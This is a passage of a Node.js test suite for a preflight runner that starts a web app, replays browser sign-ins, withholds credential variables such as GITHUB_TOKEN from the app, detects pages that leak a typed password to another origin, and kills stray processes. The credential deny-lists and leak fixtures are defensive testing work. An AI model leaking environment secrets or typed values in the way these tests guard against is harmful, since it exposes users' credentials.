    assert.equal(fs.readFileSync(otherLog, 'utf8'), '', words);
    assert.equal(await isFree(port), true, words);
  }
});

test('preflight: a sign-in that opens a new window of another origin writes the point of the page outside the app', { skip: NO_BROWSER }, async () => {
  const { here, done, port, other, otherLog } = await signIn([{ do: 'open', url: '/popup' },
    ...SIGN_IN.slice(1)], 'parcel-blue-41');
  assert.equal(done.status, 1);
  const origin = `http://127.0.0.1:${other}`;
  assert.equal(done.findings[0].split('\n')[1], 'The sign-in of scenario-1 and scenario-2 ' +
    `failed: the page opened ${origin}, outside the app, after the last action.`);
  assert.deepEqual(points(here.root), [outsidePoint(`http://127.0.0.1:${port}/`, origin)]);
  assert.equal(fs.readFileSync(otherLog, 'utf8'), '');
  assert.equal(await isFree(port), true);
});

test('preflight: a new window of the app closes too, and its point has the text of a closed window', { skip: NO_BROWSER }, async () => {
  // A typed value that is part of the words "a new window" leaves those words as they are.
  for (const value of ['parcel-blue-41', 'window']) {
    const { here, done, port } = await signIn([{ do: 'open', url: '/popup-same' },
      ...SIGN_IN.slice(1)], value);
    assert.equal(done.status, 1, value);
    assert.match(done.findings[0].split('\n')[1],
      /the page opened a new window, outside the app/, value);
    const address = `http://127.0.0.1:${port}/`;
    assert.deepEqual(points(here.root), [{
      text: `The app at ${address} opens a new window during sign-in, and the run closed it: ` +
        'a run uses one window.',
      action: 'run_again',
      fix: outsidePoint(address, 'a new window').fix,
    }], value);
    const checked = call(['check', 'points', path.join(here.root, 'points.json')],
      { cwd: here.dir });
    assert.equal(checked.status, 0, checked.out);
  }
});

test('preflight: an outside origin that contains a typed value is another origin in the point and the finding', { skip: NO_BROWSER }, async () => {
  const value = 'Parcel-Blue-41';
  const { here, done, port, otherLog } = await signIn([{ do: 'open', url: '/leak' },
    ...SIGN_IN.slice(1)], value);
  assert.equal(done.status, 1);
  assert.equal(done.findings.length, 1, done.findings.join('\n'));
  assert.match(done.findings[0].split('\n')[1], /the page opened another origin, outside the /);
  assert.deepEqual(points(here.root), [outsidePoint(`http://127.0.0.1:${port}/`,
    'another origin')]);
  const printed = [...done.findings, done.last].join('\n').toLowerCase();
  assert.equal(printed.includes(value.toLowerCase()), false, printed);
  const file = fs.readFileSync(path.join(here.root, 'points.json'), 'utf8').toLowerCase();
  assert.equal(file.includes(value.toLowerCase()), false, file);
  assert.equal(fs.readFileSync(otherLog, 'utf8'), '');
  assert.equal(call(['check', 'points', path.join(here.root, 'points.json')],
    { cwd: here.dir }).status, 0);
});

test('preflight: a data: address keeps data: as the origin in the point', { skip: NO_BROWSER }, async () => {
  const { here, done, port } = await signIn([{ do: 'open', url: 'data:text/html,<p>Sign in</p>' },
    ...SIGN_IN.slice(1)], 'parcel-blue-41');
  assert.equal(done.status, 1);
  assert.deepEqual(points(here.root), [outsidePoint(`http://127.0.0.1:${port}/`, 'data:')]);
  const checked = call(['check', 'points', path.join(here.root, 'points.json')],
    { cwd: here.dir });
  assert.equal(checked.status, 0, checked.out);
});

test('preflight: an alert of the app does not stop the sign-in', { skip: NO_BROWSER }, async () => {
  const started = Date.now();
  const { done } = await signIn([{ do: 'open', url: '/alert' }, ...SIGN_IN.slice(1)],
    'parcel-blue-41');
  assert.deepEqual(done.findings, []);
  assert.ok(Date.now() - started < 30000);
});

test('preflight: the replay types only into the element of the target', { skip: NO_BROWSER }, async () => {
  const { done } = await signIn([{ do: 'open', url: '/orders' },
    { do: 'type', target: 'h1', variable: 'DEMO_PASSWORD' }], 'parcel-blue-41');
  assert.match(done.findings[0].split('\n')[1], new RegExp(': action 2 \\(type into h1\\) ' +
    'failed: the focus is not in the element of the target\\.$'));
});

const RUNNER = path.join(SKILL, 'lib/preflight-run.cjs');

// runner starts lib/preflight-run.cjs with spec, and resolves to { status, signal, out }; after
// ms, when given, it sends the runner SIGTERM.
function runner(spec, { ms, env = {} } = {}) {
  return new Promise((resolve) => {
    const child = childProcess.spawn(process.execPath, [RUNNER],
      { stdio: ['pipe', 'pipe', 'pipe'], env: { ...process.env, ...env } });
    let out = '';
    child.stdout.on('data', (data) => { out += data; });
    child.stderr.on('data', () => {});
    child.stdin.end(JSON.stringify(spec));
    if (ms) setTimeout(() => child.kill('SIGTERM'), ms);
    child.on('exit', (status, signal) => resolve({ status, signal, out }));
  });
}

// listening starts a server of another process on port, which returns ok to each request, and
// resolves to that process once it listens.
function listening(port) {
  return new Promise((resolve) => {
    const child = childProcess.spawn(process.execPath, ['-e', 'require("http").createServer(' +
      `(q, r) => r.end("ok")).listen(${port}, "127.0.0.1", () => console.log("ready"))`],
    { stdio: ['ignore', 'pipe', 'ignore'] });
    child.stdout.once('data', () => resolve(child));
  });
}

test('preflight: another process at the address of the app counts as an app that did not start', async () => {
  const here = checkout();
  const port = await freePort();
  const other = await listening(port);
  try {
    const url = `http://127.0.0.1:${port}/`;
    const done = run(here, { serve: { command: 'echo started > started.txt', url,
      cwd: here.dir } }, { browsers: [process.execPath] });
    assert.equal(done.status, 1);
    assert.equal(done.findings[0].split('\n')[1], `another process already returns a response ` +
      `at ${url}, so the run did not start the serve command.`);
    assert.equal(points(here.root)[0].text, P02_TEXT);
    assert.equal(fs.existsSync(path.join(here.dir, 'started.txt')), false);
  } finally {
    other.kill('SIGKILL');
  }
});

test('preflight: a command that starts the app in the background and exits 0 passes, and the app stops after', async () => {
  const here = checkout();
  const port = await freePort();
  const done = run(here, { serve: { command: 'node app/server.cjs > /dev/null 2>&1 &',
    url: `http://127.0.0.1:${port}/`, cwd: here.dir } },
  { browsers: [process.execPath], env: { APP_PORT: String(port) } });
  assert.deepEqual(done.findings, []);
  assert.equal(await isFree(port), true);
});

test('preflight: serve gets every variable but the credentials and typed ones', async () => {
  const { runKey } = require(path.join(SKILL, 'lib/secrets.cjs'));
  const here = checkout();
  const port = await freePort();
  const names = path.join(here.dir, 'names.json');
  // The serve command writes the names of its environment, then starts the app. A setup of a
  // demo script types DEMO_PASSWORD; with no browser, the runner replays no setup.
  const spec = appSpec(here, port, port,
    { setups: [{ actions: SIGN_IN, names: ['DEMO_PASSWORD'] }] });
  spec.serve.command = `node -e 'require("fs").writeFileSync(${JSON.stringify(names)}, ` +
    `JSON.stringify(Object.keys(process.env)))'; ${spec.serve.command}`;
  // A name of the credential list of the run, such as ACME_HOST of ACME_*, does not reach the
  // app. A name of a secret that no list has, such as one of a cloud vendor, reaches it.
  spec.credentials = [...runLists.FLOOR, 'ACME_*'];
  const keys = { GITHUB_TOKEN: 'ghp_fake-value-0001', GH_TOKEN: 'fake-value-0002',
    QORY_RUN_KEY: 'fake-value-0003', ANTHROPIC_API_KEY: 'fake-value-0004',
    GITLAB_TOKEN: 'fake-value-0005', ACME_HOST: 'fake-value-0010' };
  const passed = { AWS_SECRET_ACCESS_KEY: 'fake-value-0006', AWS_SESSION_TOKEN: 'fake-value-0007',
    GOOGLE_APPLICATION_CREDENTIALS: '/tmp/fake-0008.json', APP_SECRET: 'fake-value-0009',
    DATABASE_PASSWORD: 'fake-value-0012' };
  const ran = await runner(spec, { env: { ...keys, ...passed, DEMO_PASSWORD: 'parcel-blue-41',
    APP_NOTE: 'plain' } });
  assert.equal(ran.status, 0);
  assert.equal(JSON.parse(ran.out).app.started, true, ran.out);
  const given = JSON.parse(fs.readFileSync(names, 'utf8'));
  // A variable of the workspace that no setup types reaches the app.
  for (const name of ['APP_NOTE', 'PATH', 'QORY_CHECK_MARK', ...Object.keys(passed)]) {
    assert.ok(given.includes(name), name);
  }
  for (const name of ['DEMO_PASSWORD', ...Object.keys(keys)]) {
    assert.equal(given.includes(name), false, name);
  }
  // The mark of lib/supervise.cjs is the one name of qory, which the runner sets.
  assert.deepEqual(given.filter(runKey), ['QORY_CHECK_MARK']);
  assert.equal(await isFree(port), true);
});

test('preflight: the serve command gets no variable that a step of a demo script types', async () => {
  const here = checkout();
  const port = await freePort();
  const names = path.join(here.dir, 'names.json');
  // The setup types no variable, so no sign-in runs; a step types DEMO_CODE.
  const typed = { ...script('scenario-1', [{ do: 'open', url: '/sign-in' }]),
    steps: [{ step: 1, title: 'Enter the code.', expected: 'The order shows.',
      actions: [{ do: 'type', target: '#code', variable: 'DEMO_CODE' }] }] };
  const done = run(here, { serve: { command: `node -e 'require("fs").writeFileSync(` +
    `${JSON.stringify(names)}, JSON.stringify(Object.keys(process.env)))'; node app/server.cjs`,
  url: `http://127.0.0.1:${port}/`, cwd: here.dir }, scripts: [typed] },
  { browsers: [process.execPath], env: { APP_PORT: String(port), DEMO_CODE: 'fake-code-4711',
    APP_NOTE: 'plain' } });
  assert.deepEqual(done.findings, []);
  const given = JSON.parse(fs.readFileSync(names, 'utf8'));
  assert.equal(given.includes('DEMO_CODE'), false);
  assert.ok(given.includes('APP_NOTE'));
  assert.equal(await isFree(port), true);
});

// servedNames runs the preflight with APP_SECRET set and the members of qory in inputs.json,
// and returns the names of the environment of the serve command.
async function servedNames(qory) {
  const here = checkout();
  const port = await freePort();
  const names = path.join(here.dir, 'names.json');
  const done = run(here, { serve: { command: `node -e 'require("fs").writeFileSync(` +
    `${JSON.stringify(names)}, JSON.stringify(Object.keys(process.env)))'; node app/server.cjs`,
  url: `http://127.0.0.1:${port}/`, cwd: here.dir },
  scripts: [script('scenario-1', [{ do: 'open', url: '/sign-in' }])] },
  { browsers: [process.execPath], env: { APP_PORT: String(port), APP_SECRET: 'fake-value-0011',
    QORY_HARNESS_HOME: harnessHome(qory) } });
  assert.deepEqual(done.findings, []);
  assert.equal(await isFree(port), true);
  return JSON.parse(fs.readFileSync(names, 'utf8'));
}

test('preflight: serve gets a name of a secret with no list in inputs.json', async () => {
  assert.ok((await servedNames({})).includes('APP_SECRET'));
});

test('preflight: a name of qory.credential_variables does not reach the app', async () => {
  assert.equal((await servedNames({ credential_variables: ['APP_SECRET'] }))
    .includes('APP_SECRET'), false);
});

test('preflight: qory.run_secret_names is not read, even with the entry *', async () => {
  // servedNames requires no finding, so a reader of the member would stop the preflight.
  assert.ok((await servedNames({ run_secret_names: ['*'] })).includes('APP_SECRET'));
});

test('preflight: a FIFO or a symbolic link at the log of the serve command is replaced by a new file', async () => {
  for (const kind of ['fifo', 'link']) {
    const here = checkout();
    const port = await freePort();
    const log = path.join(here.root, '.reports', 'preflight', 'serve.log');
    fs.mkdirSync(path.dirname(log), { recursive: true });
    const target = path.join(here.dir, 'kept.txt');
    if (kind === 'fifo') {
      assert.equal(childProcess.spawnSync('mkfifo', [log]).status, 0);
    } else {
      fs.writeFileSync(target, 'kept\n');
      fs.symlinkSync(target, log);
    }
    const started = Date.now();
    const done = run(here, { serve: { command: 'echo serving; node app/server.cjs',
      url: `http://127.0.0.1:${port}/`, cwd: here.dir } },
    { browsers: [process.execPath], env: { APP_PORT: String(port) } });
    assert.deepEqual(done.findings, [], kind);
    assert.ok(Date.now() - started < 10000, kind);
    assert.equal(fs.lstatSync(log).isFile(), true, kind);
    assert.equal(fs.readFileSync(log, 'utf8'), 'serving\n', kind);
    if (kind === 'link') assert.equal(fs.readFileSync(target, 'utf8'), 'kept\n');
    assert.equal(await isFree(port), true, kind);
  }
});

// A process that leaves the group of the serve command: it starts ESCAPED in a new session,
// writes its pid to FAKE_PID, and writes an entry of it to the folder FAKE_PROC, as
// /proc/<pid>/environ shows it on Linux. Then it starts the app.
const ESCAPED = `
const fs = require('fs');
const path = require('path');
const child = require('child_process').spawn(process.execPath,
  ['-e', 'setInterval(() => {}, 1000)'], { detached: true, stdio: 'ignore' });
child.unref();
fs.writeFileSync(process.env.FAKE_PID, String(child.pid));
fs.mkdirSync(path.join(process.env.FAKE_PROC, String(child.pid)), { recursive: true });
fs.writeFileSync(path.join(process.env.FAKE_PROC, String(child.pid), 'environ'),
  'PATH=/bin\\0QORY_CHECK_MARK=' + process.env.QORY_CHECK_MARK + '\\0');
require('./server.cjs');
`;

test('preflight: a process of the serve command that leaves its group stops with the app', async () => {
  const here = checkout();
  fs.writeFileSync(path.join(here.dir, 'app', 'escape.cjs'), ESCAPED);
  const port = await freePort();
  const fake = path.join(here.dir, 'proc');
  fs.mkdirSync(fake);
  const pidFile = path.join(here.dir, 'pid');
  let pid = null;
  try {
    const done = run(here, { serve: { command: 'node app/escape.cjs',
      url: `http://127.0.0.1:${port}/`, cwd: here.dir } },
    { browsers: [process.execPath], env: { APP_PORT: String(port), FAKE_PROC: fake,
      FAKE_PID: pidFile }, proc: process.platform === 'linux' ? undefined : fake });
    assert.deepEqual(done.findings, []);
    pid = Number(fs.readFileSync(pidFile, 'utf8'));
    const until = Date.now() + 2000;
    while (alive(pid) && Date.now() < until) { /* wait for the process to end */ }
    assert.equal(alive(pid), false, 'a process that left the group outlived the app');
  } finally {
    if (pid && alive(pid)) process.kill(pid, 'SIGKILL');
  }
});

// app returns the spec of the runner for the app of a checkout at port, which waits at the
// address of the port wait, with the browser and setups.
function appSpec(here, port, wait, more = {}) {
  return { serve: { command: `APP_PORT=${port} node app/server.cjs`,
    url: `http://127.0.0.1:${wait}/`, cwd: here.dir, log: path.join(here.dir, 'serve.log') },
  browser: null, setups: [], startMs: 60000, actionMs: 1000, signedInMs: 1000,
  limitMs: 60000, ...more };
}

test('preflight: SIGTERM while the runner waits for the app stops the app', async () => {
  const here = checkout();
  const port = await freePort();
  // The app listens on a port other than the address, so the runner keeps waiting.
  const ran = await runner(appSpec(here, port, await freePort()), { ms: 1500 });
  assert.equal(ran.status, 1);
  assert.equal(ran.out, '');
  assert.equal(await isFree(port), true);
});

// until resolves once check returns true, or rejects after ms.
async function until(check, ms, why) {
  const end = Date.now() + ms;
  while (!(await check())) {
    if (Date.now() > end) throw new Error(why);
    await new Promise((resolve) => { setTimeout(resolve, 100); });
  }
}

test('preflight: a runner whose parent ends stops the app and exits', async () => {
  const here = checkout();
  const port = await freePort();
  // The runner waits at another address, so it runs until its parent ends. The shell of the
  // serve command writes the pid of its parent, the runner.
  const spec = appSpec(here, port, await freePort());
  spec.serve.command = `echo $PPID > runner.pid; ${spec.serve.command}`;
  const parentFile = path.join(here.dir, 'parent.cjs');
  fs.writeFileSync(parentFile, `require('child_process').spawnSync(process.execPath, ` +
    `[${JSON.stringify(RUNNER)}], { input: ${JSON.stringify(JSON.stringify(spec))}, ` +
    'stdio: ["pipe", "ignore", "ignore"] });\n');
  const parent = childProcess.spawn(process.execPath, [parentFile], { stdio: 'ignore' });
  let pid = null;
  try {
    await until(async () => !(await isFree(port)), 10000, 'the app did not start');
    pid = Number(fs.readFileSync(path.join(here.dir, 'runner.pid'), 'utf8'));
    parent.kill('SIGTERM');
    await until(async () => !alive(pid) && await isFree(port), 3000,
      'the runner or the app outlived the parent');
  } finally {
    parent.kill('SIGKILL');
    if (pid && alive(pid)) process.kill(pid, 'SIGKILL');
  }
});

test('preflight: a runner whose parent ends stops its browser and removes its folder', { skip: NO_BROWSER }, async () => {
  const here = checkout();
  const port = await freePort();
  const folder = path.join(here.dir, 'tmp');
  fs.mkdirSync(folder);
  const spec = appSpec(here, port, port, { browser: BROWSER, browserMs: BROWSER_MS,
    limitMs: BROWSER_MS + 30000, setups: [{ actions: [{ do: 'open', url: '/sign-in' },
      { do: 'wait', text: 'Never shown', timeout_ms: 60000 }], names: [] }] });
  spec.serve.command = `echo $PPID > runner.pid; ${spec.serve.command}`;
  const parentFile = path.join(here.dir, 'parent.cjs');
  fs.writeFileSync(parentFile, `require('child_process').spawnSync(process.execPath, ` +
    `[${JSON.stringify(RUNNER)}], { input: ${JSON.stringify(JSON.stringify(spec))}, ` +
    'stdio: ["pipe", "ignore", "ignore"] });\n');
  const parent = childProcess.spawn(process.execPath, [parentFile],
    { stdio: 'ignore', env: { ...process.env, TMPDIR: folder } });
  // The pids of the processes whose arguments contain folder, as the profile of the browser.
  const browsers = () => childProcess.execFileSync('ps', ['-eo', 'pid=,args=']).toString()
    .split('\n').filter((line) => line.includes(folder) && !line.includes(' ps '))
    .map((line) => Number(line.trim().split(' ')[0]));
  let pid = null;
  try {
    await until(() => browsers().length > 0, BROWSER_MS, 'the browser did not start');
    pid = Number(fs.readFileSync(path.join(here.dir, 'runner.pid'), 'utf8'));
    parent.kill('SIGTERM');
    // The runner removes the folder of the browser after the browser exits, then exits.
    const profiles = () => fs.readdirSync(folder)
      .filter((name) => name.startsWith('qory-browser-'));
    await until(async () => !alive(pid) && await isFree(port) && !browsers().length &&
      !profiles().length, 5000, 'the runner, the app, the browser or its folder outlived ' +
      'the parent');
    assert.deepEqual(profiles(), []);
  } finally {
    parent.kill('SIGKILL');
    if (pid && alive(pid)) process.kill(pid, 'SIGKILL');
    for (const one of browsers()) process.kill(one, 'SIGKILL');
  }
});

test('preflight: SIGKILL of the runner stops the process group of the serve command', async () => {
  const here = checkout();
  const port = await freePort();
  const child = childProcess.spawn(process.execPath, [RUNNER], { stdio: ['pipe', 'ignore',
    'ignore'] });
  child.stdin.end(JSON.stringify(appSpec(here, port, await freePort())));
  try {
    await until(async () => !(await isFree(port)), 10000, 'the app did not start');
    child.kill('SIGKILL');
    await until(() => isFree(port), 3000, 'the app outlived the runner');
  } finally {
    child.kill('SIGKILL');
  }
});

test('preflight: SIGKILL of the runner stops the process group of the browser', async () => {
  const here = checkout();
  const port = await freePort();
  // A browser that answers nothing on the pipe, so the runner waits for its start, and that
  // starts a grandchild, which ignores SIGHUP and SIGTERM.
  const grandchild = path.join(here.dir, 'grandchild.pid');
  const browser = fakeBrowser(here, `sh -c "trap '' HUP TERM; exec sleep 92" &\n` +
    `echo $! > '${grandchild}'\nexec sleep 91`);
  const spec = appSpec(here, port, port, { browser: browser.file, browserMs: 30000,
    setups: [{ actions: SIGN_IN, names: ['DEMO_PASSWORD'] }] });
  const child = childProcess.spawn(process.execPath, [RUNNER], { stdio: ['pipe', 'ignore',
    'ignore'] });
  child.stdin.end(JSON.stringify(spec));
  const pids = [];
  const read = (file) => (fs.existsSync(file) && fs.readFileSync(file, 'utf8').endsWith('\n')
    ? Number(fs.readFileSync(file, 'utf8')) : 0);
  try {
    await until(() => read(browser.pid) > 1 && read(grandchild) > 1, 10000,
      'the browser did not start');
    pids.push(read(browser.pid), read(grandchild));
    child.kill('SIGKILL');
    await until(() => !alive(pids[0]), 3000, 'the browser outlived the runner');
    await until(() => !alive(pids[1]), 3000, 'the child of the browser outlived the runner');
    await until(() => isFree(port), 3000, 'the app outlived the runner');
  } finally {
    child.kill('SIGKILL');
    for (const pid of pids) if (pid > 1 && alive(pid)) process.kill(pid, 'SIGKILL');
  }
});

test('preflight: halt waits for the browser to exit, then removes its folder', { skip: NO_BROWSER }, async () => {
  const { Browser } = require(path.join(SKILL, 'lib/browser.cjs'));
  const browser = new Browser(BROWSER, { origin: 'http://127.0.0.1:9' });
  await browser.start(BROWSER_MS);
  await browser.page({ origin: 'http://127.0.0.1:9' });
  const { dir } = browser;
  assert.equal(fs.existsSync(dir), true);
  await browser.halt();
  assert.notEqual(browser.proc.exitCode === null && browser.proc.signalCode === null, true);
  assert.equal(fs.existsSync(dir), false);
  await new Promise((resolve) => { setTimeout(resolve, 1000); });
  assert.equal(fs.existsSync(dir), false);
});

test('preflight: a runner that fails while it waits for the app stops the app', async () => {
  const here = checkout();
  const port = await freePort();
  const wait = await freePort();
  // A module that throws in the runner 1 s after its start, and in no other process.
  const plant = path.join(here.dir, 'plant.cjs');
  fs.writeFileSync(plant, 'if (process.argv[1].endsWith("preflight-run.cjs")) ' +
    'setTimeout(() => { throw new Error("planted"); }, 1000);\n');
  const ran = await runner(appSpec(here, port, wait),
    { env: { NODE_OPTIONS: `--require ${plant}` } });
  assert.equal(ran.status, 3);
  assert.equal(await isFree(port), true);
  // The verb exits 3 with the cause of a runner that did not finish.
  assert.throws(() => run(here, { serve: { command: 'node app/server.cjs',
    url: `http://127.0.0.1:${wait}/`, cwd: here.dir } },
  { browsers: [process.execPath], env: { APP_PORT: String(port),
    NODE_OPTIONS: `--require ${plant}` } }), (error) => {
    assert.equal(error.message, 'End the run: the check of the app and the sign-in did not ' +
      'finish.');
    assert.deepEqual(error.more, ['The runner wrote "Error: planted".', 'Cause: the browser ' +
      'check did not finish: the runner exited with 3.']);
    return true;
  });
  assert.equal(await isFree(port), true);
});

test('preflight: sign-ins past the limit of the runner stop, with the app', { skip: NO_BROWSER }, async () => {
  const here = checkout();
  const port = await freePort();
  const ran = await runner(appSpec(here, port, port, { browser: BROWSER, limitMs: 4000,
    browserMs: BROWSER_MS, setups: [{ actions: [{ do: 'open', url: '/sign-in' },
      { do: 'wait', text: 'Order 1042', timeout_ms: 30000 }], names: [] }] }));
  assert.equal(ran.status, 0);
  assert.equal(JSON.parse(ran.out).unfinished, 'the sign-ins ran past the limit of 4 s');
  assert.equal(await isFree(port), true);
  // The preflight exits 3 with the cause, and the session ends the run.
  assert.throws(() => run(here, { serve: { command: 'node app/server.cjs',
    url: `http://127.0.0.1:${port}/`, cwd: here.dir }, scripts: [script('scenario-1',
    [...SIGN_IN, { do: 'wait', text: 'Never shown', timeout_ms: 30000 }])] },
  { browsers: [BROWSER], maxMs: 8000, browserMs: BROWSER_MS,
    env: { APP_PORT: String(port), DEMO_PASSWORD: 'x' } }),
  (error) => {
    assert.equal(error.message, 'End the run: the check of the app and the sign-in did not ' +
      'finish.');
    assert.deepEqual(error.more, ['Cause: the browser check did not finish: the sign-ins ran ' +
      'past the limit of 8 s.']);
    return true;
  });
  assert.equal(await isFree(port), true);
});

test('preflight: the replay gets only the variables that its setup lists', { skip: NO_BROWSER }, async () => {
  const here = checkout();
  const port = await freePort();
  const ran = await runner(appSpec(here, port, port, { browser: BROWSER, browserMs: BROWSER_MS,
    limitMs: BROWSER_MS + 30000, setups: [{ actions: [{ do: 'open', url: '/sign-in' },
      { do: 'type', target: '#password', variable: 'DEMO_PASSWORD' }], names: [] }] }),
  { env: { DEMO_PASSWORD: 'parcel-blue-41' } });
  assert.equal(JSON.parse(ran.out).signIns[0].why, 'action 2 (type into #password) failed: the ' +
    'variable DEMO_PASSWORD has no value');
  assert.equal(await isFree(port), true);
});

// fakeBrowser writes a browser to the checkout that writes its pid to the file pid, then runs
// shell, and returns { file, pid }.
function fakeBrowser(here, shell) {
  const file = path.join(here.dir, `browser-${++folders}`);
  const pid = `${file}.pid`;
  fs.writeFileSync(file, `#!/bin/sh\necho $$ > '${pid}'\n${shell}\n`, { mode: 0o755 });
  return { file, pid };
}

test('preflight: a browser that fails at its start writes the point of the browser', async () => {
  const cases = [
    // A message on the pipe that is no JSON.
    [`printf 'garbage\\000' >&4; exec sleep 97`, 'the browser failed: Browser.getVersion: the ' +
      'browser wrote a message that is no JSON'],
    // No message on the pipe.
    ['exec sleep 98', 'the browser failed: the browser did not start within 3 s', 3000],
    // A program that is no browser.
    ['exit 9', 'the browser failed: the browser exited before it started: {"code":9,' +
      '"signal":null}'],
  ];
  for (const [shell, why, browserMs] of cases) {
    const here = checkout();
    const port = await freePort();
    const browser = fakeBrowser(here, shell);
    const done = run(here, { serve: { command: 'node app/server.cjs',
      url: `http://127.0.0.1:${port}/`, cwd: here.dir }, scripts: [script('scenario-1', SIGN_IN)] },
    { browsers: [browser.file], browserMs,
      env: { APP_PORT: String(port), DEMO_PASSWORD: 'x' } });
    assert.equal(done.status, 1, shell);
    const [first, line] = done.findings[0].split('\n');
    assert.equal(first, 'End the session with points.json: the browser of the dev container ' +
      'failed.');
    assert.equal(line, `The sign-in of scenario-1 failed: ${why}.`);
    assert.deepEqual(points(here.root), [P01]);
    assert.equal(await isFree(port), true, shell);
    // The browser no longer runs.
    assert.equal(alive(Number(fs.readFileSync(browser.pid, 'utf8'))), false, shell);
  }
});

test('preflight: the browser starts with the flags that keep it from the macOS keychain', async () => {
  const { Browser } = require(path.join(SKILL, 'lib/browser.cjs'));
  const here = checkout();
  const args = path.join(here.dir, 'args');
  // A browser that writes its arguments, one per line, and exits.
  const browser = fakeBrowser(here, `printf '%s\\n' "$@" > '${args}'; exit 9`);
  for (const origin of [undefined, 'http://127.0.0.1:9']) {
    const one = new Browser(browser.file, { origin });
    await assert.rejects(one.start(3000), /the browser exited before it started/);
    await one.stop();
    const given = fs.readFileSync(args, 'utf8').split('\n');
    assert.ok(given.includes('--use-mock-keychain'), given.join(' '));
    assert.ok(given.includes('--password-store=basic'), given.join(' '));
    assert.ok(given.includes('--headless=new'), given.join(' '));
  }
});

test('preflight: a page with an origin needs a browser with that origin', async () => {
  const { Browser } = require(path.join(SKILL, 'lib/browser.cjs'));
  for (const browser of [new Browser('/usr/bin/false'),
    new Browser('/usr/bin/false', { origin: 'http://127.0.0.1:8' })]) {
    await assert.rejects(browser.page({ origin: 'http://127.0.0.1:9' }),
      /^Error: the browser blocks no request outside http:\/\/127\.0\.0\.1:9: start it with /);
  }
});

test('preflight: a process that exits with its browser running kills the browser and its child', async () => {
  const here = checkout();
  const grandchild = path.join(here.dir, 'grandchild.pid');
  // A browser that starts a grandchild, which ignores SIGHUP and SIGTERM.
  const browser = fakeBrowser(here, `sh -c "trap '' HUP TERM; exec sleep 94" &\n` +
    `echo $! > '${grandchild}'\nexec sleep 96`);
  const main = path.join(here.dir, 'exits.cjs');
  // The process exits once the grandchild has written its pid.
  const quoted = JSON.stringify(grandchild);
  fs.writeFileSync(main, `const { Browser } = require(${JSON.stringify(path.join(SKILL,
    'lib/browser.cjs'))});\n` +
    `new Browser(${JSON.stringify(browser.file)}).start().catch(() => {});\n` +
    `const fs = require('fs');\nsetInterval(() => { if (fs.existsSync(${quoted}) && ` +
    `fs.readFileSync(${quoted}, 'utf8').endsWith('\\n')) process.exit(0); }, 50);\n`);
  const folder = path.join(here.dir, 'tmp');
  fs.mkdirSync(folder);
  const pids = [];
  try {
    const ran = childProcess.spawnSync(process.execPath, [main],
      { timeout: 10000, env: { ...process.env, TMPDIR: folder } });
    pids.push(Number(fs.readFileSync(browser.pid, 'utf8')),
      Number(fs.readFileSync(grandchild, 'utf8')));
    assert.equal(ran.status, 0);
    assert.ok(pids.every((pid) => pid > 1), `no pids: ${pids}`);
    await until(() => !alive(pids[0]), 2000, 'the browser outlived its process');
    await until(() => !alive(pids[1]), 2000, 'the child of the browser outlived the process');
    assert.deepEqual(fs.readdirSync(folder), []);
  } finally {
    for (const pid of pids) if (pid > 1 && alive(pid)) process.kill(pid, 'SIGKILL');
  }
});

test('preflight: a process that exits without halt kills the child of a browser that exited first', async () => {
  const here = checkout();
  const grandchild = path.join(here.dir, 'grandchild.pid');
  // A browser that starts a grandchild, which ignores SIGHUP and SIGTERM, and then exits.
  const browser = fakeBrowser(here, `sh -c "trap '' HUP TERM; exec sleep 93" &\n` +
    `echo $! > '${grandchild}'\nexit 0`);
  const main = path.join(here.dir, 'exits-later.cjs');
  // The process waits for the start to fail, as the browser exits, and exits without halt.
  fs.writeFileSync(main, `const { Browser } = require(${JSON.stringify(path.join(SKILL,
    'lib/browser.cjs'))});\n` +
    `new Browser(${JSON.stringify(browser.file)}).start(8000)\n` +
    "  .then(() => process.exit(1), () => process.exit(0));\n");
  const folder = path.join(here.dir, 'tmp');
  fs.mkdirSync(folder);
  let pid = 0;
  try {
    const ran = childProcess.spawnSync(process.execPath, [main],
      { timeout: 10000, env: { ...process.env, TMPDIR: folder } });
    pid = Number(fs.readFileSync(grandchild, 'utf8'));
    assert.ok(pid > 1, `no pid of the grandchild: ${pid}`);
    assert.equal(ran.status, 0, String(ran.stderr));
    await until(() => !alive(pid), 2000, 'the child of the browser outlived the process');
    assert.deepEqual(fs.readdirSync(folder), []);
  } finally {
    if (pid > 1 && alive(pid)) process.kill(pid, 'SIGKILL');
  }
});

test('preflight: halt stops a child of the browser that keeps stderr open, and the process exits promptly', async () => {
  const here = checkout();
  const grandchild = path.join(here.dir, 'grandchild.pid');
  // A browser that starts a grandchild, which keeps stdout, stderr and the pipes open and
  // ignores SIGHUP and SIGTERM.
  const browser = fakeBrowser(here, `sh -c "trap '' HUP TERM; exec sleep 95" &\n` +
    `echo $! > '${grandchild}'\nexec sleep 96`);
  const main = path.join(here.dir, 'halts.cjs');
  // The process halts the browser once the grandchild has written its pid, and then has
  // nothing more to run.
  const quoted = JSON.stringify(grandchild);
  fs.writeFileSync(main, `const fs = require('fs');\nconst { Browser } = require(${
    JSON.stringify(path.join(SKILL, 'lib/browser.cjs'))});\n` +
    `const browser = new Browser(${JSON.stringify(browser.file)});\n` +
    'browser.start(8000).catch(() => {});\n' +
    `const timer = setInterval(() => {\n  if (!fs.existsSync(${quoted}) ||\n` +
    `    !fs.readFileSync(${quoted}, 'utf8').endsWith('\\n')) return;\n` +
    "  clearInterval(timer);\n  browser.halt().then(() => console.log('halted'));\n}, 50);\n");
  let pid = 0;
  try {
    const started = Date.now();
    const ran = childProcess.spawnSync(process.execPath, [main],
      { timeout: 10000, env: { ...process.env, TMPDIR: here.dir } });
    const took = Date.now() - started;
    pid = Number(fs.readFileSync(grandchild, 'utf8'));
    assert.ok(pid > 1, `no pid of the grandchild: ${pid}`);
    assert.equal(ran.status, 0, `the process ran for ${took} ms`);
    assert.equal(String(ran.stdout), 'halted\n');
    // halt waits at most 1 s for the browser, and the start of node and of the browser takes
    // well under the rest.
    assert.ok(took < 5000, `the process ran for ${took} ms`);
    await until(() => !alive(pid), 2000, 'the child of the browser outlived halt');
  } finally {
    if (pid > 1 && alive(pid)) process.kill(pid, 'SIGKILL');
    const parent = fs.existsSync(browser.pid) ? Number(fs.readFileSync(browser.pid, 'utf8')) : 0;
    if (parent > 1 && alive(parent)) process.kill(parent, 'SIGKILL');
  }
});

test('preflight: a demo script that types a credential name exits 3, and a bad entry too', () => {
  const home = (list) => harnessHome({ credential_variables: list });
  const here = checkout();
  const setup = [...SIGN_IN.slice(0, 2),
    { do: 'type', target: '#password', variable: 'ACME_HOST' }];
